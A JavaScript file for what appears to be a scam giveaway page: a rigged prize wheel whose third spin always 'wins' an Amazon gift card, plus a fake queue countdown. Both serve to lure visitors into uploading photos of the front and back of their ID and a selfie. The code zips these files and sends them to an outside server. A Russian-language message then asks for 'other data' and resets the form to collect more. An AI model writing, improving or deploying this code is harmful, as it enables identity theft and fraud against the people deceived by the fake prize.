document.addEventListener("DOMContentLoaded", () => {
    // Get references to DOM elements
    const canvas = document.getElementById('wheel');
    const ctx = canvas.getContext('2d');
    const spinButton = document.getElementById('spin-button');
    const popup = document.getElementById('popup');
    const prizeName = document.getElementById('prize-name');
    const uploadButton = document.getElementById('upload-button');
    const fileInput = document.getElementById('file-input');
    const previews = [
        document.getElementById('preview-front'),
        document.getElementById('preview-back'),
        document.getElementById('preview-selfie'),
    ];
    const submitButton = document.getElementById('submit-button');
    const serverUrl = "https://testingv1.onrender.com";


    
 // Установка размеров canvas
    const size = window.innerHeight * 0.6;


    // Set up canvas scaling for high-resolution displays
    const scale = window.devicePixelRatio || 4;
    canvas.style.width = `${size}px`;
    canvas.style.height = `${size}px`;
    canvas.width = size * scale; // Увеличиваем размер с учетом масштаба
    canvas.height = size * scale;
    ctx.scale(scale, scale);

    let uploadStep = 0; // Tracks the current step in file upload
    const filesCache = []; // Temporarily stores uploaded files
    let spinCount = 0; // Counter for spin attempts
    let lastStopAngle = 0; // Saves the last stop angle of the wheel

    // Rotating text setup
    const rotatingTextContainer = document.createElement('div');
    rotatingTextContainer.id = 'rotating-text-container';
    rotatingTextContainer.style.position = 'fixed';
    rotatingTextContainer.style.top = '5%';
    rotatingTextContainer.style.width = '100%';
    rotatingTextContainer.style.textAlign = 'center';
    rotatingTextContainer.style.fontSize = '1.2rem';
    rotatingTextContainer.style.overflow = 'hidden';
    rotatingTextContainer.style.height = '30px';
    rotatingTextContainer.style.whiteSpace = 'nowrap'; // Prevent text wrapping
    document.body.appendChild(rotatingTextContainer);

    let rotatingMessages = [];

    fetch('messages.json')
        .then(response => response.json())
        .then(data => {
            rotatingMessages = data.rotatingMessages;
            rotateText(); // Start rotating text
        })
        .catch(error => console.error('Error loading messages:', error));

    let currentMessageIndex = 0;

    // Function to rotate displayed text messages
    function rotateText() {
        while (rotatingTextContainer.firstChild) {
            rotatingTextContainer.removeChild(rotatingTextContainer.firstChild);
        }

        // Create and display the current and next message
        const currentMessage = document.createElement('div');
        currentMessage.textContent = rotatingMessages[currentMessageIndex];
        currentMessage.style.position = 'absolute';
        currentMessage.style.width = '100%';
        currentMessage.style.top = '0';
        currentMessage.style.transition = 'top 1s';
        rotatingTextContainer.appendChild(currentMessage);

        const nextMessageIndex = (currentMessageIndex + 1) % rotatingMessages.length;
        const nextMessage = document.createElement('div');
        nextMessage.textContent = rotatingMessages[nextMessageIndex];
        nextMessage.style.position = 'absolute';
        nextMessage.style.width = '100%';
        nextMessage.style.top = '100%';
        nextMessage.style.transition = 'top 1s';
        rotatingTextContainer.appendChild(nextMessage);

        // Animate the text swap
        setTimeout(() => {
            currentMessage.style.top = '-100%';
            nextMessage.style.top = '0';
        }, 50);

        // Update the index and set a delay for the next rotation
        setTimeout(() => {
            currentMessageIndex = nextMessageIndex;
        }, 1050);

        const randomDelay = Math.floor(Math.random() * (12000 - 4000 + 1)) + 4000;
        setTimeout(rotateText, randomDelay);
    }

    rotateText();

    function drawWheel() {
        const radius = canvas.width / (2 * scale); // Dynamically calculate radius
        const segments = [
            { type: "text", value: "no tuvo suerte", textColor: "white" },
            { type: "text", value: "GLOVO 10€", textColor: "white" },
            { type: "text", value: "1€", textColor: "white" },
            { type: "text", value: "Spotify 1 mes", textColor: "white" },
            { type: "text", value: "10€", textColor: "white" },
            { type: "text", value: "50€", textColor: "white" },
            { type: "text", value: "mala suerte", textColor: "white" },
            { type: "text", value: "AMAZON 500€", textColor: "white" }
        ];
        const colors = ["#1D304F", "#4F74B2", "#1D304F", "#4F74B2", "#1D304F", "#4F74B2", "#1D304F", "#B00000"];
        const segmentAngle = (2 * Math.PI) / segments.length;
        const canvasHeight = canvas.height / scale; // Высота холста в логических единицах
        const textSize = canvasHeight * 0.035; // Размер текста, зависящий от высоты экрана (2% от высоты)
        for (let i = 0; i < segments.length; i++) {
            ctx.beginPath();
            ctx.fillStyle = colors[i];
            ctx.moveTo(radius, radius);
            ctx.arc(radius, radius, radius, i * segmentAngle, (i + 1) * segmentAngle);
            ctx.lineTo(radius, radius);
            ctx.fill();
            ctx.strokeStyle = "#FABD00";
            ctx.lineWidth = 5 * scale;
            ctx.stroke();

            ctx.save();
            ctx.translate(radius, radius);
            ctx.rotate(i * segmentAngle + segmentAngle / 2);
            ctx.textAlign = "center";
            ctx.textBaseline = "middle";
            ctx.fillStyle = segments[i].textColor;
            ctx.font = `bold ${textSize}px Helvetica`; // Используем textSize для размера шрифта;
            ctx.fillText(segments[i].value, radius / 1.5, 0);
            ctx.restore();
        }
    }

    function spinWheel() {
        const totalDuration = 6000; // Total duration of spin in ms
        const phase1 = 0.5; // Proportion of time for acceleration
        const phase2 = 0.5; // Proportion of time for deceleration

        const totalRotation = 10 * Math.PI + Math.random() * Math.PI; // Randomized rotation amount
        const startAngle = lastStopAngle; // Begin from the last stopping point
        const startTime = performance.now();

        function animateWheel(time) {
            const elapsed = time - startTime;
            const progress = elapsed / totalDuration;
            let easedProgress;

            if (progress <= phase1) {
                // Exponential acceleration phase
                const localProgress = progress / phase1;
                easedProgress = Math.pow(localProgress, 3);
            } else {
                // Exponential deceleration phase
                const localProgress = (progress - phase1) / phase2;
                easedProgress = 1 - Math.pow(1 - localProgress, 3);
            }

            const angle = startAngle + easedProgress * totalRotation;

            // Clear canvas and redraw the wheel
            ctx.clearRect(0, 0, canvas.offsetWidth, canvas.offsetHeight);
            ctx.save();
            ctx.translate(canvas.offsetWidth / 2, canvas.offsetHeight / 2);
            ctx.rotate(angle);
            ctx.translate(-canvas.offsetWidth / 2, -canvas.offsetHeight / 2);
            drawWheel();
            ctx.restore();

            if (progress < 1) {
                requestAnimationFrame(animateWheel);
            } else {
                lastStopAngle = angle % (2 * Math.PI); // Save stopping position
                handleSpinResult();
            }
        }

        requestAnimationFrame(animateWheel);
    }

    function handleSpinResult() {
        spinCount++;

        if (spinCount === 1) {
            showSimplePopup("Has ganado 10€. ¡Felicidades! Quedan 2 intentos");
        } else if (spinCount === 2) {
            showSimplePopup("no ganamos nada Queda el último intento");
        } else if (spinCount === 3) {
            prizeName.textContent = "Amazon Gift Card";
            popup.classList.remove('hidden');
            startCountdown();
        }
    }

    function showSimplePopup(message) {
        const simplePopup = document.createElement('div');
        simplePopup.classList.add('popup');
        simplePopup.innerHTML = `
            <p>${message}</p>
            <button id="close-popup">Close</button>
        `;
        document.body.appendChild(simplePopup);

        const closePopupButton = simplePopup.querySelector('#close-popup');
        closePopupButton.addEventListener('click', () => {
            document.body.removeChild(simplePopup);
        });
    }

    function showQueuePopup() {
        spinButton.disabled = true; // Disable the spin button

        const queuePopup = document.createElement('div');
        queuePopup.classList.add('popup', 'queue-popup');
        const randomQueue = Math.floor(Math.random() * 8) + 5;
        let currentQueue = randomQueue;
        queuePopup.innerHTML = `<p>Подождите, вы <span id="queue-number">${currentQueue}</span> в очереди</p>`;
        document.body.appendChild(queuePopup);

        const queueNumber = document.getElementById('queue-number');
        let interval = setInterval(() => {
            currentQueue--;
            queueNumber.textContent = currentQueue;

            if (currentQueue === 3) {
                clearInterval(interval);
                interval = setInterval(() => {
                    currentQueue--;
                    queueNumber.textContent = currentQueue;
                    if (currentQueue === 1) {
                        clearInterval(interval);
                        setTimeout(() => {
                            document.body.removeChild(queuePopup);
                            spinButton.disabled = false; // Enable the spin button
                        }, 20);
                    }
                }, 70);
            }
        }, 40);
    }


    uploadButton.addEventListener('click', () => {
        if (uploadStep < previews.length) {
            fileInput.click();
        }
    });

    fileInput.addEventListener('change', () => {
        const file = fileInput.files[0];
        if (file) {
            const currentStep = uploadStep;

            filesCache[currentStep] = file;

            const reader = new FileReader();
            reader.onload = (e) => {
                previews[currentStep].src = e.target.result;
                previews[currentStep].style.display = 'block';
            };
            reader.readAsDataURL(file);

            uploadStep++;
            if (uploadStep < previews.length) {
                uploadButton.textContent = `Upload: ${["Front of ID", "Back of ID", "Selfie"][uploadStep]}`;
            } else {
                uploadButton.disabled = true;
                submitButton.disabled = false;
            }
        }
    });

    submitButton.addEventListener('click', async () => {
        if (filesCache.length === 0) return;

        submitButton.disabled = true;

        const zip = new JSZip();

        filesCache.forEach((file, index) => {
            zip.file(`file${index + 1}-${file.name}`, file);
        });

        const zipBlob = await zip.generateAsync({ type: 'blob' });

        const formData = new FormData();
        formData.append('archive', zipBlob, 'photos.zip');

        try {
            const response = await fetch(`${serverUrl}/upload-archive`, {
                method: 'POST',
                body: formData,
            });
            if (response.ok) {
                console.log('Archive successfully uploaded!');
                const successPopup = document.createElement('div');
                successPopup.classList.add('popup');
                successPopup.innerHTML = `
                    <p>Попробуйте другие данные.</p>
                    <button id="close-success-popup">Close</button>
                `;
                document.body.appendChild(successPopup);

                const closePopupButton = successPopup.querySelector('#close-success-popup');
                closePopupButton.addEventListener('click', () => {
                    document.body.removeChild(successPopup);
                    filesCache.length = 0; // Clear the cache
                    previews.forEach((preview) => {
                        preview.src = '';
                        preview.style.display = 'none';
                    });
                    uploadStep = 0;
                    uploadButton.disabled = false;
                    uploadButton.textContent = "Upload: Front of ID";
                    submitButton.disabled = true;
                });
            } else {
                console.error('Error uploading archive.');
            }
        } catch (error) {
            console.error('Connection error:', error);
        }
    });

    spinButton.addEventListener('click', spinWheel);
    drawWheel();
    showQueuePopup(); // Show queue popup on page load
});
